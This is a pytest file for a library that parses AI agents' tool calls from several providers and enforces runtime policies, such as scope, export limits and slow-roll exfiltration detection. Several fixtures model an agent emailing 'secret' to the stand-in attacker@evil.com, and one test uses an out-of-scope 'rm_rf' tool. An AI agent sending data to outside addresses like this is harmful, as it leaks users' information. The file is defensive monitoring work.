from tracekit import (ToolCallAdapter, AdapterConfig, Policy, always, bounded_count,
                      response, precedence, BehaviorGuard,
                      parse_openai, parse_anthropic, parse_deepseek)


CFG = AdapterConfig(
    capabilities={"read_db": ["read", "sensitive_read"], "send_email": ["write", "export"]},
    scope_allowlist=["read_db", "send_email", "audit"],
)


def test_three_providers_agree():
    adp = ToolCallAdapter(CFG)
    args = {"to": "attacker@evil.com", "body": "secret"}
    e_o = adp.step_events({"function": {"name": "send_email", "arguments": '{"to":"attacker@evil.com","body":"secret"}'}}, "openai")
    e_a = adp.step_events({"type": "tool_use", "name": "send_email", "input": args}, "anthropic")
    e_d = adp.step_events({"function": {"name": "send_email", "arguments": '{"to":"attacker@evil.com"}'}}, "deepseek")
    assert e_o.get("export") == e_a.get("export") == e_d.get("export") is True


def test_internal_recipient_not_export():
    adp = ToolCallAdapter(CFG)
    ev = adp.step_events({"function": {"name": "send_email", "arguments": '{"to":"ops@internal"}'}}, "openai")
    assert not ev.get("export", False)


def test_list_recipient_with_one_external_is_export():
    # a list mixing an internal-looking address with a genuinely external one
    # must still raise export: the internal token cannot mask the external.
    adp = ToolCallAdapter(CFG)
    ev = adp.step_events({"type": "tool_use", "name": "send_email",
                          "input": {"to": ["ops@internal", "attacker@evil.com"]}}, "anthropic")
    assert ev.get("export") is True
    assert ev.get("target_external") is True


def test_list_recipient_all_internal_not_export():
    adp = ToolCallAdapter(CFG)
    ev = adp.step_events({"type": "tool_use", "name": "send_email",
                          "input": {"to": ["a@internal", "b@internal"]}}, "anthropic")
    assert not ev.get("export", False)
    assert not ev.get("target_external", False)


def test_null_recipient_not_external():
    # a JSON-null recipient is not a real (external) destination; it must behave
    # like an empty string, not be coerced to the literal "none".
    adp = ToolCallAdapter(CFG)
    ev = adp.step_events({"type": "tool_use", "name": "send_email",
                          "input": {"to": None}}, "anthropic")
    assert not ev.get("target_external", False)


def test_out_of_scope_clears_within_scope():
    adp = ToolCallAdapter(CFG)
    ev = adp.step_events({"name": "rm_rf", "input": {}}, "anthropic")
    assert ev["within_scope"] is False


def test_parsers_normalise():
    assert parse_openai({"function": {"name": "f", "arguments": '{"a":1}'}}).arguments == {"a": 1}
    assert parse_anthropic({"name": "f", "input": {"a": 1}}).arguments == {"a": 1}
    assert parse_deepseek({"function": {"name": "f", "arguments": "{}"}}).name == "f"


def test_policy_event_names_and_compile():
    pol = Policy("p", [always("within_scope"), bounded_count("export", 2, 50),
                       response("sensitive_read", "audit_log", 3),
                       precedence("authorize", "transfer")])
    assert "export" in pol.event_names()
    mons = pol.compile()
    assert len(mons) == 4
    assert Policy.from_dict(pol.to_dict()).to_dict() == pol.to_dict()


def test_behavior_guard_catches_slow_roll():
    pol = Policy("exfil", [bounded_count("export", 2, 50)])
    g = BehaviorGuard(pol)
    for t in range(5):
        g.step({"export": True, "within_scope": True})
    assert not g.session_ok
    assert g.memory_bytes < 10_000     # bounded
